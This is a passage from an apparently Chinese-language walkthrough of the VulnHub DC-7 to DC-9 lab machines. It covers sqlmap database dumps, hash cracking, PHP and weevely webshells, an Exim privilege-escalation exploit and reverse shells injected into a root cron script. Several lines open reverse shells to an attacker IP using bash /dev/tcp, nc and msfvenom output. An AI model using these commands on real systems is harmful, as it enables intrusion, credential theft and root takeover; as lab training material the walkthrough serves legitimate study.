class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br></pre></td><td class="code"><pre><span class="line">From root@dc-7 Thu Aug 29 17:00:22 2019</span><br><span class="line">Return-path: &lt;root@dc-7&gt;</span><br><span class="line">Envelope-to: root@dc-7</span><br><span class="line">Delivery-date: Thu, 29 Aug 2019 17:00:22 +1000</span><br><span class="line">Received: from root by dc-7 with local (Exim 4.89)</span><br><span class="line">        (envelope-from &lt;root@dc-7&gt;)</span><br><span class="line">        id 1i3EPu-0000CV-5C</span><br><span class="line">        for root@dc-7; Thu, 29 Aug 2019 17:00:22 +1000</span><br><span class="line">From: root@dc-7 (Cron Daemon)</span><br><span class="line">To: root@dc-7</span><br><span class="line">Subject: Cron &lt;root@dc-7&gt; /opt/scripts/backups.sh</span><br><span class="line">MIME-Version: 1.0</span><br><span class="line">Content-Type: text/plain; charset=UTF-8</span><br><span class="line">Content-Transfer-Encoding: 8bit</span><br><span class="line">X-Cron-Env: &lt;PATH=/bin:/usr/bin:/usr/local/bin:/sbin:/usr/sbin&gt;</span><br><span class="line">X-Cron-Env: &lt;SHELL=/bin/sh&gt;</span><br><span class="line">X-Cron-Env: &lt;HOME=/root&gt;</span><br><span class="line">X-Cron-Env: &lt;LOGNAME=root&gt;</span><br><span class="line">Message-Id: &lt;E1i3EPu-0000CV-5C@dc-7&gt;</span><br><span class="line">Date: Thu, 29 Aug 2019 17:00:22 +1000</span><br><span class="line"> </span><br><span class="line">Database dump saved to /home/dc7user/backups/website.sql               [success]</span><br><span class="line">gpg: symmetric encryption of &#x27;/home/dc7user/backups/website.tar.gz&#x27; failed: File exists</span><br><span class="line">gpg: symmetric encryption of &#x27;/home/dc7user/backups/website.sql&#x27; failed: File exists</span><br><span class="line"> </span><br><span class="line">From root@dc-7 Thu Aug 29 17:15:11 2019</span><br><span class="line">Return-path: &lt;root@dc-7&gt;</span><br><span class="line">Envelope-to: root@dc-7</span><br><span class="line">Delivery-date: Thu, 29 Aug 2019 17:15:11 +1000</span><br><span class="line">Received: from root by dc-7 with local (Exim 4.89)</span><br><span class="line">        (envelope-from &lt;root@dc-7&gt;)</span><br><span class="line">        id 1i3EeF-0000Dx-G1</span><br><span class="line">        for root@dc-7; Thu, 29 Aug 2019 17:15:11 +1000</span><br><span class="line">From: root@dc-7 (Cron Daemon)</span><br><span class="line">To: root@dc-7</span><br><span class="line">Subject: Cron &lt;root@dc-7&gt; /opt/scripts/backups.sh</span><br><span class="line">MIME-Version: 1.0</span><br><span class="line">Content-Type: text/plain; charset=UTF-8</span><br><span class="line">Content-Transfer-Encoding: 8bit</span><br><span class="line">X-Cron-Env: &lt;PATH=/bin:/usr/bin:/usr/local/bin:/sbin:/usr/sbin&gt;</span><br><span class="line">X-Cron-Env: &lt;SHELL=/bin/sh&gt;</span><br><span class="line">X-Cron-Env: &lt;HOME=/root&gt;</span><br><span class="line">X-Cron-Env: &lt;LOGNAME=root&gt;</span><br><span class="line">Message-Id: &lt;E1i3EeF-0000Dx-G1@dc-7&gt;</span><br><span class="line">Date: Thu, 29 Aug 2019 17:15:11 +1000</span><br><span class="line"> </span><br><span class="line">Database dump saved to /home/dc7user/backups/website.sql               [success]</span><br><span class="line">gpg: symmetric encryption of &#x27;/home/dc7user/backups/website.tar.gz&#x27; failed: File exists</span><br><span class="line">gpg: symmetric encryption of &#x27;/home/dc7user/backups/website.sql&#x27; failed: File exists</span><br><span class="line"> </span><br><span class="line">From root@dc-7 Thu Aug 29 17:30:11 2019</span><br><span class="line">Return-path: &lt;root@dc-7&gt;</span><br><span class="line">Envelope-to: root@dc-7</span><br><span class="line">Delivery-date: Thu, 29 Aug 2019 17:30:11 +1000</span><br><span class="line">Received: from root by dc-7 with local (Exim 4.89)</span><br><span class="line">        (envelope-from &lt;root@dc-7&gt;)</span><br><span class="line">        id 1i3Esl-0000Ec-JQ</span><br><span class="line">        for root@dc-7; Thu, 29 Aug 2019 17:30:11 +1000</span><br><span class="line">From: root@dc-7 (Cron Daemon)</span><br><span class="line">To: root@dc-7</span><br><span class="line">Subject: Cron &lt;root@dc-7&gt; /opt/scripts/backups.sh</span><br><span class="line">MIME-Version: 1.0</span><br><span class="line">Content-Type: text/plain; charset=UTF-8</span><br><span class="line">Content-Transfer-Encoding: 8bit</span><br><span class="line">X-Cron-Env: &lt;PATH=/bin:/usr/bin:/usr/local/bin:/sbin:/usr/sbin&gt;</span><br><span class="line">X-Cron-Env: &lt;SHELL=/bin/sh&gt;</span><br><span class="line">X-Cron-Env: &lt;HOME=/root&gt;</span><br><span class="line">X-Cron-Env: &lt;LOGNAME=root&gt;</span><br><span class="line">Message-Id: &lt;E1i3Esl-0000Ec-JQ@dc-7&gt;</span><br><span class="line">Date: Thu, 29 Aug 2019 17:30:11 +1000</span><br><span class="line"> </span><br><span class="line">Database dump saved to /home/dc7user/backups/website.sql               [success]</span><br><span class="line">gpg: symmetric encryption of &#x27;/home/dc7user/backups/website.tar.gz&#x27; failed: File exists</span><br><span class="line">gpg: symmetric encryption of &#x27;/home/dc7user/backups/website.sql&#x27; failed: File exists</span><br><span class="line"> </span><br><span class="line">From root@dc-7 Thu Aug 29 17:45:11 2019</span><br><span class="line">Return-path: &lt;root@dc-7&gt;</span><br><span class="line">Envelope-to: root@dc-7</span><br><span class="line">Delivery-date: Thu, 29 Aug 2019 17:45:11 +1000</span><br><span class="line">Received: from root by dc-7 with local (Exim 4.89)</span><br><span class="line">        (envelope-from &lt;root@dc-7&gt;)</span><br><span class="line">        id 1i3F7H-0000G3-Nb</span><br><span class="line">        for root@dc-7; Thu, 29 Aug 2019 17:45:11 +1000</span><br><span class="line">From: root@dc-7 (Cron Daemon)</span><br><span class="line">To: root@dc-7</span><br><span class="line">Subject: Cron &lt;root@dc-7&gt; /opt/scripts/backups.sh</span><br><span class="line">MIME-Version: 1.0</span><br><span class="line">Content-Type: text/plain; charset=UTF-8</span><br><span class="line">Content-Transfer-Encoding: 8bit</span><br><span class="line">X-Cron-Env: &lt;PATH=/bin:/usr/bin:/usr/local/bin:/sbin:/usr/sbin&gt;</span><br><span class="line">X-Cron-Env: &lt;SHELL=/bin/sh&gt;</span><br><span class="line">X-Cron-Env: &lt;HOME=/root&gt;</span><br><span class="line">X-Cron-Env: &lt;LOGNAME=root&gt;</span><br><span class="line">Message-Id: &lt;E1i3F7H-0000G3-Nb@dc-7&gt;</span><br><span class="line">Date: Thu, 29 Aug 2019 17:45:11 +1000</span><br><span class="line"> </span><br><span class="line">Database dump saved to /home/dc7user/backups/website.sql               [success]</span><br><span class="line">gpg: symmetric encryption of &#x27;/home/dc7user/backups/website.tar.gz&#x27; failed: File exists</span><br><span class="line">gpg: symmetric encryption of &#x27;/home/dc7user/backups/website.sql&#x27; failed: File exists</span><br><span class="line"> </span><br><span class="line">From root@dc-7 Thu Aug 29 20:45:21 2019</span><br><span class="line">Return-path: &lt;root@dc-7&gt;</span><br><span class="line">Envelope-to: root@dc-7</span><br><span class="line">Delivery-date: Thu, 29 Aug 2019 20:45:21 +1000</span><br><span class="line">Received: from root by dc-7 with local (Exim 4.89)</span><br><span class="line">        (envelope-from &lt;root@dc-7&gt;)</span><br><span class="line">        id 1i3Hvd-0000ED-CP</span><br><span class="line">        for root@dc-7; Thu, 29 Aug 2019 20:45:21 +1000</span><br><span class="line">From: root@dc-7 (Cron Daemon)</span><br><span class="line">To: root@dc-7</span><br><span class="line">Subject: Cron &lt;root@dc-7&gt; /opt/scripts/backups.sh</span><br><span class="line">MIME-Version: 1.0</span><br><span class="line">Content-Type: text/plain; charset=UTF-8</span><br><span class="line">Content-Transfer-Encoding: 8bit</span><br><span class="line">X-Cron-Env: &lt;PATH=/bin:/usr/bin:/usr/local/bin:/sbin:/usr/sbin&gt;</span><br><span class="line">X-Cron-Env: &lt;SHELL=/bin/sh&gt;</span><br><span class="line">X-Cron-Env: &lt;HOME=/root&gt;</span><br><span class="line">X-Cron-Env: &lt;LOGNAME=root&gt;</span><br><span class="line">Message-Id: &lt;E1i3Hvd-0000ED-CP@dc-7&gt;</span><br><span class="line">Date: Thu, 29 Aug 2019 20:45:21 +1000</span><br><span class="line"> </span><br><span class="line">Database dump saved to /home/dc7user/backups/website.sql               [success]</span><br><span class="line">gpg: symmetric encryption of &#x27;/home/dc7user/backups/website.tar.gz&#x27; failed: File exists</span><br><span class="line">gpg: symmetric encryption of &#x27;/home/dc7user/backups/website.sql&#x27; failed: File exists</span><br><span class="line"> </span><br><span class="line">From root@dc-7 Thu Aug 29 22:45:17 2019</span><br><span class="line">Return-path: &lt;root@dc-7&gt;</span><br><span class="line">Envelope-to: root@dc-7</span><br><span class="line">Delivery-date: Thu, 29 Aug 2019 22:45:17 +1000</span><br><span class="line">Received: from root by dc-7 with local (Exim 4.89)</span><br><span class="line">        (envelope-from &lt;root@dc-7&gt;)</span><br><span class="line">        id 1i3Jng-0000Iw-Rq</span><br><span class="line">        for root@dc-7; Thu, 29 Aug 2019 22:45:16 +1000</span><br><span class="line">From: root@dc-7 (Cron Daemon)</span><br><span class="line">To: root@dc-7</span><br><span class="line">Subject: Cron &lt;root@dc-7&gt; /opt/scripts/backups.sh</span><br><span class="line">MIME-Version: 1.0</span><br><span class="line">Content-Type: text/plain; charset=UTF-8</span><br><span class="line">Content-Transfer-Encoding: 8bit</span><br><span class="line">X-Cron-Env: &lt;PATH=/bin:/usr/bin:/usr/local/bin:/sbin:/usr/sbin&gt;</span><br><span class="line">X-Cron-Env: &lt;SHELL=/bin/sh&gt;</span><br><span class="line">X-Cron-Env: &lt;HOME=/root&gt;</span><br><span class="line">X-Cron-Env: &lt;LOGNAME=root&gt;</span><br><span class="line">Message-Id: &lt;E1i3Jng-0000Iw-Rq@dc-7&gt;</span><br><span class="line">Date: Thu, 29 Aug 2019 22:45:16 +1000</span><br><span class="line"> </span><br><span class="line">Database dump saved to /home/dc7user/backups/website.sql               [success]</span><br><span class="line"> </span><br><span class="line">From root@dc-7 Thu Aug 29 23:00:12 2019</span><br><span class="line">Return-path: &lt;root@dc-7&gt;</span><br><span class="line">Envelope-to: root@dc-7</span><br><span class="line">Delivery-date: Thu, 29 Aug 2019 23:00:12 +1000</span><br><span class="line">Received: from root by dc-7 with local (Exim 4.89)</span><br><span class="line">        (envelope-from &lt;root@dc-7&gt;)</span><br><span class="line">        id 1i3K28-0000Ll-11</span><br><span class="line">        for root@dc-7; Thu, 29 Aug 2019 23:00:12 +1000</span><br><span class="line">From: root@dc-7 (Cron Daemon)</span><br><span class="line">To: root@dc-7</span><br><span class="line">Subject: Cron &lt;root@dc-7&gt; /opt/scripts/backups.sh</span><br><span class="line">MIME-Version: 1.0</span><br><span class="line">Content-Type: text/plain; charset=UTF-8</span><br><span class="line">Content-Transfer-Encoding: 8bit</span><br><span class="line">X-Cron-Env: &lt;PATH=/bin:/usr/bin:/usr/local/bin:/sbin:/usr/sbin&gt;</span><br><span class="line">X-Cron-Env: &lt;SHELL=/bin/sh&gt;</span><br><span class="line">X-Cron-Env: &lt;HOME=/root&gt;</span><br><span class="line">X-Cron-Env: &lt;LOGNAME=root&gt;</span><br><span class="line">Message-Id: &lt;E1i3K28-0000Ll-11@dc-7&gt;</span><br><span class="line">Date: Thu, 29 Aug 2019 23:00:12 +1000</span><br><span class="line"> </span><br><span class="line">Database dump saved to /home/dc7user/backups/website.sql               [success]</span><br><span class="line"> </span><br><span class="line">From root@dc-7 Fri Aug 30 00:15:18 2019</span><br><span class="line">Return-path: &lt;root@dc-7&gt;</span><br><span class="line">Envelope-to: root@dc-7</span><br><span class="line">Delivery-date: Fri, 30 Aug 2019 00:15:18 +1000</span><br><span class="line">Received: from root by dc-7 with local (Exim 4.89)</span><br><span class="line">        (envelope-from &lt;root@dc-7&gt;)</span><br><span class="line">        id 1i3LCo-0000Eb-02</span><br><span class="line">        for root@dc-7; Fri, 30 Aug 2019 00:15:18 +1000</span><br><span class="line">From: root@dc-7 (Cron Daemon)</span><br><span class="line">To: root@dc-7</span><br><span class="line">Subject: Cron &lt;root@dc-7&gt; /opt/scripts/backups.sh</span><br><span class="line">MIME-Version: 1.0</span><br><span class="line">Content-Type: text/plain; charset=UTF-8</span><br><span class="line">Content-Transfer-Encoding: 8bit</span><br><span class="line">X-Cron-Env: &lt;PATH=/bin:/usr/bin:/usr/local/bin:/sbin:/usr/sbin&gt;</span><br><span class="line">X-Cron-Env: &lt;SHELL=/bin/sh&gt;</span><br><span class="line">X-Cron-Env: &lt;HOME=/root&gt;</span><br><span class="line">X-Cron-Env: &lt;LOGNAME=root&gt;</span><br><span class="line">Message-Id: &lt;E1i3LCo-0000Eb-02@dc-7&gt;</span><br><span class="line">Date: Fri, 30 Aug 2019 00:15:18 +1000</span><br><span class="line"> </span><br><span class="line">rm: cannot remove &#x27;/home/dc7user/backups/*&#x27;: No such file or directory</span><br><span class="line">Database dump saved to /home/dc7user/backups/website.sql               [success]</span><br><span class="line"> </span><br><span class="line">From root@dc-7 Fri Aug 30 03:15:17 2019</span><br><span class="line">Return-path: &lt;root@dc-7&gt;</span><br><span class="line">Envelope-to: root@dc-7</span><br><span class="line">Delivery-date: Fri, 30 Aug 2019 03:15:17 +1000</span><br><span class="line">Received: from root by dc-7 with local (Exim 4.89)</span><br><span class="line">        (envelope-from &lt;root@dc-7&gt;)</span><br><span class="line">        id 1i3O0y-0000Ed-To</span><br><span class="line">        for root@dc-7; Fri, 30 Aug 2019 03:15:17 +1000</span><br><span class="line">From: root@dc-7 (Cron Daemon)</span><br><span class="line">To: root@dc-7</span><br><span class="line">Subject: Cron &lt;root@dc-7&gt; /opt/scripts/backups.sh</span><br><span class="line">MIME-Version: 1.0</span><br><span class="line">Content-Type: text/plain; charset=UTF-8</span><br><span class="line">Content-Transfer-Encoding: 8bit</span><br><span class="line">X-Cron-Env: &lt;PATH=/bin:/usr/bin:/usr/local/bin:/sbin:/usr/sbin&gt;</span><br><span class="line">X-Cron-Env: &lt;SHELL=/bin/sh&gt;</span><br><span class="line">X-Cron-Env: &lt;HOME=/root&gt;</span><br><span class="line">X-Cron-Env: &lt;LOGNAME=root&gt;</span><br><span class="line">Message-Id: &lt;E1i3O0y-0000Ed-To@dc-7&gt;</span><br><span class="line">Date: Fri, 30 Aug 2019 03:15:17 +1000</span><br><span class="line"> </span><br><span class="line">rm: cannot remove &#x27;/home/dc7user/backups/*&#x27;: No such file or directory</span><br><span class="line">Database dump saved to /home/dc7user/backups/website.sql               [success]</span><br></pre></td></tr></table></figure>

<p><img src="/../imgs/Vulnhub-DC89.png"></p>
<p>于是我们查看<code>/opt/scripts/backups.sh</code>文件发现这个脚本正在以<code>root</code>的身份运行并且和<code>www-data</code>在同一个组中，再来查看内容可以看到有个drush命令，它可以用于更改帐户密码</p>
<blockquote>
<p>drush是drupal shell，用来管理drupal的命令列工具，用于与drupal cms进行通信</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">dc7user@dc-7:~$ cat /opt/scripts/backups.sh</span><br><span class="line">#!/bin/bash</span><br><span class="line">rm /home/dc7user/backups/*</span><br><span class="line">cd /var/www/html/</span><br><span class="line">drush sql-dump --result-file=/home/dc7user/backups/website.sql</span><br><span class="line">cd ..</span><br><span class="line">tar -czf /home/dc7user/backups/website.tar.gz html/</span><br><span class="line">gpg --pinentry-mode loopback --passphrase PickYourOwnPassword --symmetric /home/dc7user/backups/website.sql</span><br><span class="line">gpg --pinentry-mode loopback --passphrase PickYourOwnPassword --symmetric /home/dc7user/backups/website.tar.gz</span><br><span class="line">chown dc7user:dc7user /home/dc7user/backups/*</span><br><span class="line">rm /home/dc7user/backups/website.sql</span><br><span class="line">rm /home/dc7user/backups/website.tar.gz</span><br></pre></td></tr></table></figure>

<p><img src="/../imgs/Vulnhub-DC90.png"></p>
<p>接着切换到<code>/var/www/html</code>目录下，在有<code>Drupal</code>的环境中尝试使用该命令来更改管理员密码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">drush user-password admin --password=admin</span><br></pre></td></tr></table></figure>

<p><img src="/../imgs/Vulnhub-DC91.png"></p>
<p>再来登录页面可以看到我们此时可以成功登录了</p>
<p><img src="/../imgs/Vulnhub-DC92.png"></p>
<h2 id="漏洞攻击-5"><a href="#漏洞攻击-5" class="headerlink" title="漏洞攻击"></a>漏洞攻击</h2><p>接着点击<code>Manage -&gt; Extend -&gt; Install new module</code>发现可以上传模块，于是我们下载Drupal的PHP包并上传tar文件，点击<code>Enable newly added modules</code>启用它，再勾选<code>PHP Filter</code>后点击<code>Install</code>完成模块的安装</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://www.drupal.org/project/php</span><br><span class="line">https://ftp.drupal.org/files/projects/php-8.x-1.0.tar.gz</span><br></pre></td></tr></table></figure>

<p><img src="/../imgs/Vulnhub-DC93.png"></p>
<p><img src="/../imgs/Vulnhub-DC94.png"></p>
<p><img src="/../imgs/Vulnhub-DC95.png"></p>
<p><img src="/../imgs/Vulnhub-DC96.png"></p>
<p>然后点击<code>Content -&gt; Add content -&gt; Basic page</code>，在<code>Text format</code>处选择<code>PHP code</code>并放入反弹shell的代码，点击<code>Preview</code>成功反弹shell后生成一个交互式shell</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure>

<p><img src="/../imgs/Vulnhub-DC97.png"></p>
<p>后面看到可以利用weevely生成木马并通过weevely连接木马</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># weevely generate 密码 生成的路径及文件名</span><br><span class="line">weevely generate harvey /root/harvey.php</span><br><span class="line">weevely http://192.168.150.153/node/4 harvey</span><br></pre></td></tr></table></figure>

<p><img src="/../imgs/Vulnhub-DC98.png"></p>
<p>接着我们就可以来到<code>/opt/scripts</code>目录下添加反弹shell的命令到<code>backups.sh</code>文件中并执行它实现提权</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"># 提权失败？</span><br><span class="line">echo &quot;bash -i &gt;&amp; /dev/tcp/192.168.150.128/4444 0&gt;&amp;1&quot; &gt; backups.sh</span><br><span class="line"> </span><br><span class="line"># 后面查看wp说是要这样写，但是我试了下还是提权失败😅</span><br><span class="line">echo &quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.150.128 4444 &gt;/tmp/f&quot; &gt;&gt; backups.sh</span><br><span class="line"> </span><br><span class="line"># 还有个利用msfvenom来生成反向shell，但是依旧提权失败😣</span><br><span class="line">msfvenom -p cmd/unix/reverse_netcat lhost=192.168.150.128 lport=4444 R</span><br><span class="line">[-] No platform was selected, choosing Msf::Module::Platform::Unix from the payload</span><br><span class="line">[-] No arch selected, selecting arch: cmd from the payload</span><br><span class="line">No encoder specified, outputting raw payload</span><br><span class="line">Payload size: 93 bytes</span><br><span class="line">mkfifo /tmp/fmsr; nc 192.168.150.128 4444 0&lt;/tmp/fmsr | /bin/sh &gt;/tmp/fmsr 2&gt;&amp;1; rm /tmp/fmsr</span><br><span class="line">echo &quot;mkfifo /tmp/fmsr; nc 192.168.150.128 4444 0&lt;/tmp/fmsr | /bin/sh &gt;/tmp/fmsr 2&gt;&amp;1; rm /tmp/fmsr&quot; &gt;&gt; backups.sh</span><br></pre></td></tr></table></figure>

<p>后面重启了一下靶机再试试反弹shell就可以了，amazing🤣</p>
<p><img src="/../imgs/Vulnhub-DC99.png"></p>
<h1 id="DC-8"><a href="#DC-8" class="headerlink" title="DC-8"></a>DC-8</h1><h2 id="信息收集-4"><a href="#信息收集-4" class="headerlink" title="信息收集"></a>信息收集</h2><p>nmap扫描存活主机和端口，发现开放了22、80端口</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 35a7e6c4a83c631de1c0caa366bc88bf (RSA)</span><br><span class="line">|   256 abef9f69acea54c68c6155490ae7aad9 (ECDSA)</span><br><span class="line">|_  256 7ab2c687ec9376d4ea594b1bc6e873f2 (ED25519)</span><br><span class="line">80/tcp open  http    Apache httpd</span><br><span class="line">| http-robots.txt: 36 disallowed entries (15 shown)</span><br><span class="line">| /includes/ /misc/ /modules/ /profiles/ /scripts/ </span><br><span class="line">| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt </span><br><span class="line">| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt </span><br><span class="line">|_/LICENSE.txt /MAINTAINERS.txt</span><br><span class="line">|_http-title: Welcome to DC-8 | DC-8</span><br><span class="line">|_http-generator: Drupal 7 (http://drupal.org)</span><br><span class="line">|_http-server-header: Apache</span><br></pre></td></tr></table></figure>

<p><img src="/../imgs/Vulnhub-DC100.png"></p>
<p>访问80端口是个Drupal的站点，信息如下：</p>
<p><img src="/../imgs/Vulnhub-DC101.png"></p>
<h2 id="漏洞攻击-6"><a href="#漏洞攻击-6" class="headerlink" title="漏洞攻击"></a>漏洞攻击</h2><p>接着我们注意到<code>/CHANGELOG.txt</code>文件，访问可知Drupal的版本为7.67</p>
<p><img src="/../imgs/Vulnhub-DC102.png"></p>
<p>于是搜索一下对应版本存在的漏洞，然而这些都没啥用😒</p>
<p><img src="/../imgs/Vulnhub-DC103.png"></p>
<p>再回头来看一下页面的功能块，发现有个可疑参数<code>?nid=1</code>，尝试加个<code>&#39;</code>发现有报错如下：</p>
<p><img src="/../imgs/Vulnhub-DC104.png"></p>
<p>于是我们利用sqlmap跑一下，发现有个可疑的数据库<code>d7db</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://192.168.150.154/?nid=1 --batch --dbs</span><br></pre></td></tr></table></figure>

<p><img src="/../imgs/Vulnhub-DC105.png"></p>
<p>接着查表发现如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://192.168.150.154/?nid=1 --batch -D d7db --tables</span><br></pre></td></tr></table></figure>

<p><img src="/../imgs/Vulnhub-DC106.png"></p>
<p>接着再来dump一下users表发现存在admin和john两个用户</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀hacker)-[~]</span><br><span class="line">└─# sqlmap -u http://192.168.150.154/?nid=1 --batch -D d7db -T users --dump</span><br><span class="line">┌──(root💀hacker)-[~]</span><br><span class="line">└─# sqlmap -u http://192.168.150.154/?nid=1 --batch -D d7db -T users -C name,pass --dump</span><br><span class="line">Database: d7db</span><br><span class="line">Table: users</span><br><span class="line">[2 entries]</span><br><span class="line">+-------+---------------------------------------------------------+</span><br><span class="line">| name  | pass                                                    |</span><br><span class="line">+-------+---------------------------------------------------------+</span><br><span class="line">| admin | $S$D2tRcYRyqVFNSc0NvYUrYeQbLQg5koMKtihYTIDC9QQqJi3ICg5z |</span><br><span class="line">| john  | $S$DqupvJbxVmqjr6cYePnx2A891ln7lsuku/3if/oRVZJaz5mKC2vF |</span><br><span class="line">+-------+---------------------------------------------------------+</span><br></pre></td></tr></table></figure>

<p><img src="/../imgs/Vulnhub-DC107.png"></p>
<p>于是尝试爆破hash，得到用户john的密码：turtle</p>
<p><img src="/../imgs/Vulnhub-DC108.png"></p>
<p>从而成功登录Drupal</p>
<p><img src="/../imgs/Vulnhub-DC109.png"></p>
<p>点击<code>Content -&gt; Add content -&gt; Basic page</code>发现这里只能编辑纯文本，无法添加php代码</p>
<p><img src="/../imgs/Vulnhub-DC110.png"></p>
<p>于是接着翻一翻，在<code>Contact Us -&gt; Form settings</code>中发现可以插入php代码，输入php-reverse-shell并保存</p>
<p><img src="/../imgs/Vulnhub-DC111.png"></p>
<p>然后填写好信息后点击<code>Submit</code>即可反弹shell，并生成一个交互式shell</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure>

<p><img src="/../imgs/Vulnhub-DC112.png"></p>
<p>接着查看是否有可利用的SUID，发现有个具有SUID权限的异常二进制文件<code>/usr/sbin/exim4</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -4000 2&gt;/dev/null</span><br></pre></td></tr></table></figure>

<p><img src="/../imgs/Vulnhub-DC113.png"></p>
<p>于是查看exim的版本为<code>4.89</code>并搜索相关漏洞发现有个<code>Exim 4.87 - 4.91 - Local Privilege Escalation</code></p>
<p><img src="/../imgs/Vulnhub-DC114.png"></p>
<p>然后开个web服务并上传<code>sh</code>文件，这里需要切换至<code>/tmp</code>目录才有权限</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cd /tmp</span><br><span class="line">chmod 777 46996.sh</span><br><span class="line">bash ./46996.sh -m netcat</span><br><span class="line">nc -e /bin/sh 192.168.150.128 4444</span><br></pre></td></tr></table></figure>

<p><img src="/../imgs/Vulnhub-DC115.png"></p>
<p>运行<code>sh</code>文件，nc反弹shell即可成功提权得到flag</p>
<p><img src="/../imgs/Vulnhub-DC116.png"></p>
<h1 id="DC-9"><a href="#DC-9" class="headerlink" title="DC-9"></a>DC-9</h1><h2 id="信息收集-5"><a href="#信息收集-5" class="headerlink" title="信息收集"></a>信息收集</h2><p>nmap扫描存活主机和端口，发现开放了80端口</p>
<p><img src="/../imgs/Vulnhub-DC117.png"></p>
<p>访问80端口如下：</p>
<p><img src="/../imgs/Vulnhub-DC118.png"></p>
<h2 id="漏洞攻击-7"><a href="#漏洞攻击-7" class="headerlink" title="漏洞攻击"></a>漏洞攻击</h2><p>查看功能块发现<code>Search</code>模块输入任何数据它都会返回到<code>results.php</code></p>
<p><img src="/../imgs/Vulnhub-DC119.png"></p>
<p>于是burp抓包将其保存到文本中</p>
<p><img src="/../imgs/Vulnhub-DC120.png"></p>
<p>然后使用此请求丢到sqlmap里跑一下获取数据库</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀hacker)-[~]</span><br><span class="line">└─# sqlmap -r DC-9-request.txt --batch --dbs</span><br><span class="line">available databases [3]:                                                                 [*] information_schema                                                                   [*] Staff                                                                                 [*] users</span><br></pre></td></tr></table></figure>

<p><img src="/../imgs/Vulnhub-DC121.png"></p>
<p>接着查表发现有个<code>UserDetails</code>的表</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀hacker)-[~]</span><br><span class="line">└─# sqlmap -r DC-9-request.txt --batch -D users --tables</span><br><span class="line">Database: users</span><br><span class="line">[1 table]</span><br><span class="line">+-------------+</span><br><span class="line">| UserDetails |</span><br><span class="line">+-------------+</span><br></pre></td></tr></table></figure>

<p><img src="/../imgs/Vulnhub-DC122.png"></p>
<p>接着再来dump一下发现存在如下用户：</p>
